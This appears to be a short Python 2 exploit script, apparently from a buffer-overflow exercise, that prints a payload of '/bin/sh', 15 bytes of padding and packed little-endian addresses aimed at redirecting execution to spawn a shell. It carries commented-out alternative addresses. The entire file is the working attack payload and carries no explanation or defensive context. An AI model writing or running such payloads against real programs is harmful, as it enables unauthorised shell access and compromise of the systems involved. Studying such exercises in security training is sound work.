from struct import pack
from shellcode import shellcode
my_shell = '/bin/sh'
print my_shell + 'a'*15 + pack("<I",0x08048eed ) + pack("<I", 0xbffefd34) + my_shell + '\x00'
#+ pack("<I",0xBFFEFD16)
#+ my_shell + '\x00'